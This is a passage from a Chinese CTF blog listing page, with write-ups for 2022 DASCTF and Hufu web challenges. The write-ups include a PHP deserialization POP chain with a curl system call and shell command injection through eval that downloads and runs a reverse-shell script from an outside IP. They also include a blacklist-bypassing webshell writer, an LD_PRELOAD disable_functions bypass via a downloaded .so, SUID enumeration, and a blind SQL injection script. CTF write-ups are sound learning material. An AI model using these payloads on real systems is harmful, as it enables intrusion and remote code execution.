<li>codebase可控</li>
<li>安装并配置了SecurityManager</li>
<li>Java版本低于7u21、6u45，或者设置了java.rmi.server.useCodebaseOnly=false其中java.rmi.server.useCodebaseOnly是在Java 7u21、6u45的时候修改的一个默认设置：</li>
<li><a target="_blank" rel="noopener" href="https://docs.oracle.com/javase/7/docs/technotes/guides/rmi/enhancements-7.html">https://docs.oracle.com/javase/7/docs/technotes/guides/rmi/enhancements-7.html</a></li>
<li><a target="_blank" rel="noopener" href="https://www.oracle.com/technetwork/java/javase/7u21-relnotes-1932873.html">https://www.oracle.com/technetwork/java/javase/7u21-relnotes-1932873.html</a></li>
</ul>
<p>PS：当java.rmi.server.useCodebaseOnly为true时，java虚拟机将只信任预先配置好的codebase。</p>
<h3 id="classAnnotations"><a href="#classAnnotations" class="headerlink" title="classAnnotations"></a>classAnnotations</h3><p>可以使用SerializationDumper查看数据包中的java反序列化内容</p>
<p>通过修改classAnnotations可以控制codebase。</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2022/03/30/2022LINE-CTF/">2022LINE-CTF</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-03-30</time><div class="content"></div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2022/03/27/2022DASCTF-3/">2022DASCTF_3</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-03-27</time><div class="content"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这几天都在护网，正好有比赛，打的累的时候就来看看题转换一下心情</p>
<h2 id="ezpop"><a href="#ezpop" class="headerlink" title="ezpop"></a>ezpop</h2><p>简单的pop链，后面记得覆盖一下就好</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fin</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $f1;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">what</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $a;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mix</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $m1;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">crow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $v1;</span><br><span class="line">    <span class="keyword">public</span> $v2;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$a=<span class="keyword">new</span> fin();</span><br><span class="line">$b=<span class="keyword">new</span> what();</span><br><span class="line">$c=<span class="keyword">new</span> mix();</span><br><span class="line">$d=<span class="keyword">new</span> crow();</span><br><span class="line">$e=<span class="keyword">new</span> fin();</span><br><span class="line">$f=<span class="keyword">new</span> mix();</span><br><span class="line">$e-&gt;f1=$f;</span><br><span class="line">$f-&gt;m1=<span class="string">&quot;\n system(&#x27;curl xx&#x27;);&quot;</span>;</span><br><span class="line">$d-&gt;v1=$e;</span><br><span class="line">$c-&gt;m1=$d;</span><br><span class="line">$b-&gt;a=$c;</span><br><span class="line">$a-&gt;f1=$b;</span><br><span class="line">$h=serialize($a);</span><br><span class="line"><span class="keyword">echo</span> urlencode($h);</span><br></pre></td></tr></table></figure>

<h2 id="calc"><a href="#calc" class="headerlink" title="calc"></a>calc</h2><p>python的，很少做打python的题目，所以很多姿势都不是很清楚</p>
<h3 id="1-import导入类并继承加载"><a href="#1-import导入类并继承加载" class="headerlink" title="1.import导入类并继承加载"></a>1.import导入类并继承加载</h3><p>这也是搜索出来比较多的方法，但是他把很多东西都过滤了，所以这种方法不太行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;import&#39;,&#39;(&#39;,&#39;)&#39;,&#39; &#39;,&#39;_&#39;,&#39;|&#39;,&#39;;&#39;,&#39;&quot;&#39;,&#39;&#123;&#39;,&#39;&#125;&#39;,&#39;&amp;&#39;,&#39;getattr&#39;,&#39;os&#39;,&#39;system&#39;,&#39;class&#39;,&#39;subclasses&#39;,&#39;mro&#39;,&#39;request&#39;,&#39;args&#39;,&#39;eval&#39;,&#39;if&#39;,&#39;subprocess&#39;,&#39;file&#39;,&#39;open&#39;,&#39;popen&#39;,&#39;builtins&#39;,&#39;compile&#39;,&#39;execfile&#39;,&#39;from_pyfile&#39;,&#39;config&#39;,&#39;local&#39;,&#39;self&#39;,&#39;item&#39;,&#39;getitem&#39;,&#39;getattribute&#39;,&#39;func_globals&#39;,&#39;__init__&#39;,&#39;join&#39;,&#39;__dict__&#39;</span><br></pre></td></tr></table></figure>

<h2 id="2-非预期"><a href="#2-非预期" class="headerlink" title="2.非预期"></a>2.非预期</h2><p>这里先积累一个非预期吧，这个地方的思路也挺巧妙的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data = eval(<span class="string">&quot;7*7#`curl http://11xxx:9999`&quot;</span>)</span><br><span class="line">os.system(log)</span><br></pre></td></tr></table></figure>

<p>利用的是两种语言加载一样的特性，eval加载的是python的语言，而system使用的是shell语言特性，所以我们首先让eval执行7*7并先注释掉后面的内容，然后使用system去执行反引号内的系统命令,那么这就意味着，我们此时得到了一个无回显的shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &#123;0&#125; &#123;1&#125; &quot;7*7#&#96;xxxxx&#96;&quot;&gt; .&#x2F;tmp&#x2F;log.txt</span><br></pre></td></tr></table></figure>

<p>接下来我们可以是curl命令下载一个反弹shell的sh文件到tmp目录下，并执行这个sh文件就行了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">7*7%23&#96;curl%09http:&#x2F;&#x2F;110.42.1&#x2F;aa&gt;&#x2F;tmp&#x2F;a&#96; </span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">7*7%23&#96;chmod%09777%09&#x2F;tmp&#x2F;a&#96; </span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#96;&#x2F;tmp&#x2F;a&#96; </span><br></pre></td></tr></table></figure>

<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>感觉做这题的时候，思维有点被禁锢住了，其实看到一个eval和一个system的时候，就要想到语言的差异性往往也是引起漏洞的开始</p>
<h2 id="upgdstore"><a href="#upgdstore" class="headerlink" title="upgdstore"></a>upgdstore</h2><p>可以传phpinfo()，但是过滤了很多关键字，所以还是要先拿到他的源码才行，发现过滤了file关键字，可以采取拼接的方式进行绕过</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php echo (&#39;fil&#39;.&#39;e_get_contents&#39;)(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&#39;);</span><br></pre></td></tr></table></figure>

<p>拿到源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fun</span>(<span class="params">$var</span>): <span class="title">bool</span></span>&#123;</span><br><span class="line">    $blacklist = [<span class="string">&quot;\$_&quot;</span>, <span class="string">&quot;eval&quot;</span>,<span class="string">&quot;copy&quot;</span> ,<span class="string">&quot;assert&quot;</span>,<span class="string">&quot;usort&quot;</span>,<span class="string">&quot;include&quot;</span>, <span class="string">&quot;require&quot;</span>, <span class="string">&quot;$&quot;</span>, <span class="string">&quot;^&quot;</span>, <span class="string">&quot;~&quot;</span>, <span class="string">&quot;-&quot;</span>, <span class="string">&quot;%&quot;</span>, <span class="string">&quot;*&quot;</span>,<span class="string">&quot;file&quot;</span>,<span class="string">&quot;fopen&quot;</span>,<span class="string">&quot;fwriter&quot;</span>,<span class="string">&quot;fput&quot;</span>,<span class="string">&quot;copy&quot;</span>,<span class="string">&quot;curl&quot;</span>,<span class="string">&quot;fread&quot;</span>,<span class="string">&quot;fget&quot;</span>,<span class="string">&quot;function_exists&quot;</span>,<span class="string">&quot;dl&quot;</span>,<span class="string">&quot;putenv&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;shell_exec&quot;</span>,<span class="string">&quot;passthru&quot;</span>,<span class="string">&quot;proc_open&quot;</span>,<span class="string">&quot;proc_close&quot;</span>, <span class="string">&quot;proc_get_status&quot;</span>,<span class="string">&quot;checkdnsrr&quot;</span>,<span class="string">&quot;getmxrr&quot;</span>,<span class="string">&quot;getservbyname&quot;</span>,<span class="string">&quot;getservbyport&quot;</span>, <span class="string">&quot;syslog&quot;</span>,<span class="string">&quot;popen&quot;</span>,<span class="string">&quot;show_source&quot;</span>,<span class="string">&quot;highlight_file&quot;</span>,<span class="string">&quot;`&quot;</span>,<span class="string">&quot;chmod&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span>($blacklist <span class="keyword">as</span> $blackword)&#123;</span><br><span class="line">        <span class="keyword">if</span>(strstr($var, $blackword)) <span class="keyword">return</span> <span class="literal">True</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span>;</span><br><span class="line">&#125;</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//设置上传目录</span></span><br><span class="line">define(<span class="string">&quot;UPLOAD_PATH&quot;</span>, <span class="string">&quot;./uploads&quot;</span>);</span><br><span class="line">$msg = <span class="string">&quot;Upload Success!&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">$temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">$file_name = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">$ext = pathinfo($file_name,PATHINFO_EXTENSION);</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&quot;/php/i&quot;</span>, strtolower($ext)))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;只要好看的php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$content = file_get_contents($temp_file);</span><br><span class="line"><span class="keyword">if</span>(fun($content))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;诶，被我发现了吧&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">$new_file_name = md5($file_name).<span class="string">&quot;.&quot;</span>.$ext;</span><br><span class="line">        $img_path = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . $new_file_name;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path))&#123;</span><br><span class="line">            $is_upload = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">&#x27;Upload Failed!&#x27;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>发现确实过滤了很多东西，但是我们现在可以通过拼接绕过，接下来就是考虑如何写入webshell 了,直接贴一下大师傅的文章，利用的是内置类SplFileObject::fwrite写入内容，并且使用define定义常量将其写入文件中，没见过的姿势，学习了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">define(<span class="string">&quot;EV&quot;</span>, <span class="string">&quot;eva&quot;</span>.<span class="string">&quot;l&quot;</span>);</span><br><span class="line">define(<span class="string">&quot;GETCONT&quot;</span>, <span class="string">&quot;fil&quot;</span>.<span class="string">&quot;e_get_contents&quot;</span>);</span><br><span class="line"><span class="comment">// 由于禁止了$，我们只能从已有的地方获取$符</span></span><br><span class="line">define(<span class="string">&quot;D&quot;</span>,(GETCONT)(<span class="string">&#x27;/var/www/html/index.php&#x27;</span>)[<span class="number">353</span>]);</span><br><span class="line">define(<span class="string">&quot;SHELL&quot;</span>,<span class="string">&quot;&lt;?php &quot;</span>.EV.<span class="string">&quot;(&quot;</span>.D.<span class="string">&quot;_POST[&#x27;a&#x27;]);&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> (GETCONT)(<span class="string">&#x27;./shell.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">splf</span> <span class="keyword">extends</span> <span class="title">SplFileObject</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="built_in">parent</span>::fwrite(SHELL);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">define(<span class="string">&quot;PHARA&quot;</span>, <span class="keyword">new</span> splf(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>));</span><br></pre></td></tr></table></figure>

<p>获得一句话木马的shell以后，就需要绕一下disable_function了，这里一般考虑的也是写入ld更改环境变量</p>
<p>写入环境变量是通过在本地搭建一个ftp服务，然后</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a=</span><br><span class="line">$local_file = <span class="string">&#x27;/tmp/hack1.so&#x27;</span>;</span><br><span class="line">$server_file = <span class="string">&#x27;hack.so&#x27;</span>;</span><br><span class="line">$ftp_server = <span class="string">&#x27;110.xxxx.120&#x27;</span>;</span><br><span class="line">$ftp_port=<span class="number">25</span>;</span><br><span class="line"></span><br><span class="line">$ftp = ftp_connect($ftp_server,$ftp_port);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$login_result = ftp_login($ftp, <span class="string">&#x27;anonymous&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span><br><span class="line">ftp_pasv($ftp,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ftp_get($ftp, $local_file, $server_file, FTP_BINARY)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Successfully written to <span class="subst">$local_file</span>\n&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;There was a problem\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ftp_close($ftp);</span><br></pre></td></tr></table></figure>

<p>这里值得一提的是，这个ftp服务应该是要和so文件放在同一目录下，不然就要写绝对路径（应该是这样），然后如果你要是用本来已经开启的ftp服务，需要在login那边写一下你的账号密码才行</p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20220327195720.png" alt="img"></p>
<p>这个时候就成功写入了，接下来就是putenv+mail函数反弹shell即可</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">putenv(<span class="string">&quot;LD_PRELOAD=/var/www/vhosts/topleadtool.com/httpdocs/inc/hack.so&quot;</span>);</span><br><span class="line">mail(<span class="string">&quot;a@localhost&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>拿flag的时候发现权限不够，需要提权，最近的那个洞不行，所以suid尝试一下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find &#x2F;bin -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line">find &#x2F;usr -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line">find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure>

<p>新学了几个姿势，然后就可以getshell了</p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20220327200526.png" alt="img"></p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2022/03/19/%E8%99%8E%E7%AC%A6/">2022虎符</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2022-03-19</time><div class="content"><h2 id="babysql"><a href="#babysql" class="headerlink" title="babysql"></a>babysql</h2><p>比赛的时候一开始没发现过滤了空格，所以一直出不了，后来才发现，所以说，对于不确定的正则表达式还是要去实际测试一下才行，然后一看就是要盲注，由于过滤了括号</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.replace(&#x2F;[\s,()#;*\-]&#x2F;g, &#39;&#39;)</span><br><span class="line">.replace(&#x2F;^.*(?&#x3D;union|binary).*$&#x2F;gi, &#39;&#39;)</span><br><span class="line">.toString();</span><br></pre></td></tr></table></figure>

<p>所以首选肯定是case，接下来就是构造盲注语句了，由于是要用regexp来构造，读一下文档，发现regexp可以直接作为等号来使用，并且无需空格，可直接比对内容，一开始构造的是,问题在于直接这样是会爆出语法错误的，这个时候’1’和case直接需要有东西隔开，当时思维禁锢住了，没想到使用||。。。。傻逼了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">or&#39;1&#39;&#x3D;&#39;1&#39;case&#39;1&#39;whenxxxx</span><br></pre></td></tr></table></figure>

<p>构造出来以后可以得到</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;a&#39;||case&#39;1&#39;when&#39;1&#39;then&#39;1&#39;else&#39;0&#39;end||&#39;a&#39;;</span><br></pre></td></tr></table></figure>

<p>，接下来就是使用regexp进行盲注，盲注的结果分为两种，一种是状态401，一种是状态500,500是因为报错才会产生的，所以我们就构造一个报错盲注,由于不能使用函数，所以这里可以通过数值之间的大数运算来引起报错</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;a&#39;||case&#39;1&#39;when&#39;1&#39;then&#39;1&#39;else~0+~0+&#39;a&#39;end||&#39;a&#39;;</span><br></pre></td></tr></table></figure>

<p>接下来就是完善最重要的regexp的盲注部分了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;||case&#39;1&#39;when&#96;username&#96;regexp&#39;^Db&#39;then&#39;1&#39;else~0+~0+&#39;a&#39;end||&#39;a&#39; limit 1;</span><br></pre></td></tr></table></figure>

<p>但是接下来还需要解决大小写问题，查阅mysql8.0的文档，发现regexp在比对的时候可以设置字符集用来表示规则（也就是可以比对大小写）但是我在本地测试的时候，发现要使用对应数据库的编码形式才可以，看了一下hint，可以发现这个数据库是使用这个编码规则的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">COLLATE&#x3D;utf8mb4_0900_as_cs</span><br></pre></td></tr></table></figure>

<p>所以我们的payload也呼之欲出了,使用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;||case&#39;1&#39;when&#96;username&#96;regexp&#39;a&#39;COLLATE‘utf8mb4_0900_as_cs’then&#39;1&#39;else~0+~0+&#39;a&#39;end||&#39;a</span><br></pre></td></tr></table></figure>

<p>接下来就是写成脚本了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">url=<span class="string">&quot;http://110.42.133.120:8080/login&quot;</span></span><br><span class="line">s=requests.session()</span><br><span class="line"><span class="comment">#a=string.printable</span></span><br><span class="line">a=<span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!%&amp;&#x27;/:&lt;=&gt;@[]^_`&#123;&#125;~^!$&quot;</span></span><br><span class="line">print(a)</span><br><span class="line">print(a[<span class="number">-3</span>:])</span><br><span class="line">str = <span class="string">&quot;&quot;</span><span class="comment">#aeoo</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> a[<span class="number">-3</span>:]:</span><br><span class="line">            i=i.replace(i,<span class="string">f&#x27;\\\\<span class="subst">&#123;i&#125;</span>&#x27;</span>)</span><br><span class="line">        payload=<span class="string">f&quot;a&#x27;||case&#x27;1&#x27;when`password`regexp&#x27;^<span class="subst">&#123;str+i&#125;</span>&#x27;COLLATE`utf8mb4_0900_as_cs`then&#x27;1&#x27;else~0+~0+&#x27;a&#x27;end||&#x27;a&quot;</span></span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>:payload,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>:<span class="string">&quot;a&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r=s.post(url,data=data).text</span><br><span class="line">        print(r)</span><br><span class="line">        print(payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;401&quot;</span> <span class="keyword">in</span> r:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;\\&quot;</span> <span class="keyword">in</span> i:</span><br><span class="line">                i.replace(<span class="string">&quot;\\\\&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">            str+=i</span><br><span class="line">            print(<span class="string">f&quot;[+]<span class="subst">&#123;str&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>



</div><hr></div><nav id="pagination"><div class="pagination"><a class="extend prev" rel="prev" href="/page/3/"><i class="fa fa-chevron-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><span class="space">&hellip;</span><a class="page-number" href="/page/26/">26</a><a class="extend next" rel="next" href="/page/5/"><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2023 By vague huang</div><div class="framework-info"><span>Driven - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span><span></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/lib/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.9.0"></script><script src="/js/fancybox.js?version=1.9.0"></script><script src="/js/sidebar.js?version=1.9.0"></script><script src="/js/copy.js?version=1.9.0"></script><script src="/js/fireworks.js?version=1.9.0"></script><script src="/js/transition.js?version=1.9.0"></script><script src="/js/scroll.js?version=1.9.0"></script><script src="/js/head.js?version=1.9.0"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false});</script></body></html>